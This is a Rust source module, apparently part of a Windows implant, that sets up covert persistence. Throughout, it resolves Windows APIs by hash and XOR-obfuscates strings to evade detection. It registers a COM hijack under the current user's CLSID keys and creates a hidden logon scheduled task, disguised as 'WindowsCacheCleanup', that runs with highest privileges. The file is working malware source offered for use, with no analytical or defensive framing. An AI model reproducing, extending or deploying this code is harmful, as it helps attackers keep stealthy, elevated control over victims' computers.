//! # Persistence (Dynamic API) - HARDENED
//!
//! NO winreg or windows crate = minimal import table.
//! - COM Hijacking: Native Registry API via api_resolver
//! - Scheduled Task: schtasks.exe via CreateProcessA

use std::ffi::c_void;
use std::ptr;
use log::{info, warn, debug};

use super::api_resolver::{self, djb2};

/// Simple XOR decode helper (Key: 0x55)
fn x(bytes: &[u8]) -> String {
    let key = 0x55;
    let decoded: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();
    String::from_utf8(decoded).unwrap_or_default()
}

/// Convert string to wide (UTF-16) for Windows API
fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

// Registry API types
type RegCreateKeyExW = unsafe extern "system" fn(
    hKey: isize, lpSubKey: *const u16, Reserved: u32, lpClass: *const u16,
    dwOptions: u32, samDesired: u32, lpSecurityAttributes: *const c_void,
    phkResult: *mut isize, lpdwDisposition: *mut u32
) -> i32;

type RegSetValueExW = unsafe extern "system" fn(
    hKey: isize, lpValueName: *const u16, Reserved: u32, dwType: u32,
    lpData: *const u8, cbData: u32
) -> i32;

type RegCloseKey = unsafe extern "system" fn(hKey: isize) -> i32;

type CreateProcessA = unsafe extern "system" fn(
    lpApplicationName: *const u8, lpCommandLine: *mut u8,
    lpProcessAttributes: *const c_void, lpThreadAttributes: *const c_void,
    bInheritHandles: i32, dwCreationFlags: u32,
    lpEnvironment: *const c_void, lpCurrentDirectory: *const u8,
    lpStartupInfo: *const StartupInfo, lpProcessInformation: *mut ProcessInfo
) -> i32;

// Minimal structures for CreateProcessA
#[repr(C)]
struct StartupInfo {
    cb: u32,
    reserved: *const u8,
    desktop: *const u8,
    title: *const u8,
    x: u32, y: u32, x_size: u32, y_size: u32,
    x_count_chars: u32, y_count_chars: u32,
    fill_attribute: u32, flags: u32,
    show_window: u16, reserved2: u16,
    reserved3: *const u8, std_input: isize, std_output: isize, std_error: isize,
}

#[repr(C)]
struct ProcessInfo {
    process: isize, thread: isize, process_id: u32, thread_id: u32,
}

// Hashes
const HASH_REG_CREATE_KEY_EX_W: u32 = 0x9CB4594C;
const HASH_REG_SET_VALUE_EX_W: u32 = 0x02ACF196;
const HASH_REG_CLOSE_KEY: u32 = 0x66579AD4;
const HASH_CREATE_PROCESS_A: u32 = 0x5768C90B;
const HASH_ADVAPI32: u32 = 0x03C6B585;

const HKEY_CURRENT_USER: isize = 0x80000001u32 as isize;
const KEY_ALL_ACCESS: u32 = 0xF003F;
const REG_SZ: u32 = 1;
const CREATE_NO_WINDOW: u32 = 0x08000000;

/// Apply all persistence mechanisms (Native API)
pub fn apply_persistence_triad(exe_path: &str) {
    debug!("Applying persistence (native API)...");
    
    // 1. COM Hijacking (Registry)
    if let Err(e) = setup_com_hijacking(exe_path) {
        warn!("COM Hijacking failed: {}", e);
    }
    
    // 2. Scheduled Task (schtasks.exe)
    if let Err(e) = setup_scheduled_task(exe_path) {
        warn!("Scheduled Task failed: {}", e);
    }
    
    debug!("Persistence complete");
}

/// Setup COM Hijacking using native Registry API
fn setup_com_hijacking(exe_path: &str) -> Result<(), String> {
    #[cfg(target_os = "windows")]
    unsafe {
        // Target CLSID
        let clsid = "{f3b946ba-7543-41c9-9435-0539f1b3999c}"; 
        
        // Build path: Software\Classes\CLSID\{...}\LocalServer32
        let p1 = x(&[0x06, 0x3A, 0x33, 0x21, 0x22, 0x34, 0x27, 0x30]); // Software
        let p2 = x(&[0x16, 0x39, 0x34, 0x26, 0x26, 0x30, 0x26]);       // Classes
        let p3 = x(&[0x16, 0x19, 0x06, 0x1C, 0x11]);                   // CLSID
        let ls32 = x(&[0x19, 0x3A, 0x36, 0x34, 0x39, 0x06, 0x30, 0x27, 0x23, 0x30, 0x27, 0x66, 0x67]); // LocalServer32
        
        let path = format!("{}\\{}\\{}\\{}\\{}", p1, p2, p3, clsid, ls32);
        let path_wide = to_wide(&path);
        
        // Load advapi32 if needed
        ensure_advapi32_loaded()?;
        
        let advapi32 = api_resolver::get_module_by_hash(HASH_ADVAPI32)
            .ok_or("advapi32 not loaded")?;

        let reg_create: RegCreateKeyExW = api_resolver::get_export_by_hash(advapi32, HASH_REG_CREATE_KEY_EX_W)
            .map(|p| std::mem::transmute(p))
            .ok_or("RegCreateKeyExW not found")?;
            
        let reg_set: RegSetValueExW = api_resolver::get_export_by_hash(advapi32, HASH_REG_SET_VALUE_EX_W)
            .map(|p| std::mem::transmute(p))
            .ok_or("RegSetValueExW not found")?;
            
        let reg_close: RegCloseKey = api_resolver::get_export_by_hash(advapi32, HASH_REG_CLOSE_KEY)
            .map(|p| std::mem::transmute(p))
            .ok_or("RegCloseKey not found")?;

        // Create key
        let mut hkey: isize = 0;
        let mut disposition: u32 = 0;
        
        let status = reg_create(
            HKEY_CURRENT_USER, path_wide.as_ptr(), 0, ptr::null(),
            0, KEY_ALL_ACCESS, ptr::null(), &mut hkey, &mut disposition
        );
        
        if status != 0 {
            return Err(format!("RegCreateKeyExW: {}", status));
        }

        // Set default value (empty name = default)
        let empty_name: [u16; 1] = [0];
        let exe_wide = to_wide(exe_path);
        
        let status = reg_set(
            hkey, empty_name.as_ptr(), 0, REG_SZ,
            exe_wide.as_ptr() as *const u8, (exe_wide.len() * 2) as u32
        );
        
        reg_close(hkey);
        
        if status != 0 {
            return Err(format!("RegSetValueExW: {}", status));
        }

        debug!("COM Hijack set (native)");
        Ok(())
    }
    
    #[cfg(not(target_os = "windows"))]
    Ok(())
}

/// Setup Scheduled Task using schtasks.exe (simpler than COM interface)
fn setup_scheduled_task(exe_path: &str) -> Result<(), String> {
    #[cfg(target_os = "windows")]
    unsafe {
        // Task name (obfuscated)
        let t1 = x(&[0x02, 0x3C, 0x3B, 0x31, 0x3A, 0x22, 0x26]); // Windows
        let t2 = x(&[0x16, 0x34, 0x36, 0x3D, 0x30]);             // Cache
        let t3 = x(&[0x16, 0x39, 0x30, 0x34, 0x3B, 0x20, 0x25]); // Cleanup
        let task_name = format!("{}{}{}", t1, t2, t3);
        
        // Build schtasks command
        // schtasks /create /tn "name" /tr "path" /sc onlogon /rl highest /f
        let cmd = format!(
            "schtasks /create /tn \"{}\" /tr \"{}\" /sc onlogon /rl highest /f",
            task_name, exe_path
        );
        
        let mut cmd_bytes: Vec<u8> = cmd.into_bytes();
        cmd_bytes.push(0); // null terminate
        
        // Resolve CreateProcessA
        let create_process: CreateProcessA = api_resolver::resolve_api(
            api_resolver::HASH_KERNEL32, HASH_CREATE_PROCESS_A
        ).ok_or("CreateProcessA not found")?;
        
        // Setup structures
        let mut si = StartupInfo {
            cb: std::mem::size_of::<StartupInfo>() as u32,
            reserved: ptr::null(), desktop: ptr::null(), title: ptr::null(),
            x: 0, y: 0, x_size: 0, y_size: 0,
            x_count_chars: 0, y_count_chars: 0,
            fill_attribute: 0, flags: 0,
            show_window: 0, reserved2: 0,
            reserved3: ptr::null(), std_input: 0, std_output: 0, std_error: 0,
        };
        
        let mut pi = ProcessInfo {
            process: 0, thread: 0, process_id: 0, thread_id: 0,
        };
        
        // Run schtasks (hidden)
        let result = create_process(
            ptr::null(), cmd_bytes.as_mut_ptr(),
            ptr::null(), ptr::null(), 0, CREATE_NO_WINDOW,
            ptr::null(), ptr::null(), &si, &mut pi
        );
        
        if result != 0 {
            // Close handles
            if let Some(close_handle) = api_resolver::resolve_api::<unsafe extern "system" fn(isize) -> i32>(
                api_resolver::HASH_KERNEL32, api_resolver::HASH_CLOSE_HANDLE
            ) {
                close_handle(pi.process);
                close_handle(pi.thread);
            }
            debug!("Scheduled Task created (schtasks)");
            Ok(())
        } else {
            Err("CreateProcessA failed".to_string())
        }
    }
    
    #[cfg(not(target_os = "windows"))]
    Ok(())
}

/// Ensure advapi32.dll is loaded
#[cfg(target_os = "windows")]
unsafe fn ensure_advapi32_loaded() -> Result<(), String> {
    if api_resolver::get_module_by_hash(HASH_ADVAPI32).is_some() {
        return Ok(());
    }
    
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *const c_void;
    let load_lib: LoadLibraryA = api_resolver::resolve_api(
        api_resolver::HASH_KERNEL32, 
        api_resolver::HASH_LOAD_LIBRARY_A
    ).ok_or("LoadLibraryA not found")?;
    
    let dll = b"advapi32.dll\0";
    let result = load_lib(dll.as_ptr());
    
    if result.is_null() {
        Err("Failed to load advapi32".to_string())
    } else {
        Ok(())
    }
}

#[cfg(not(target_os = "windows"))]
unsafe fn ensure_advapi32_loaded() -> Result<(), String> { Ok(()) }
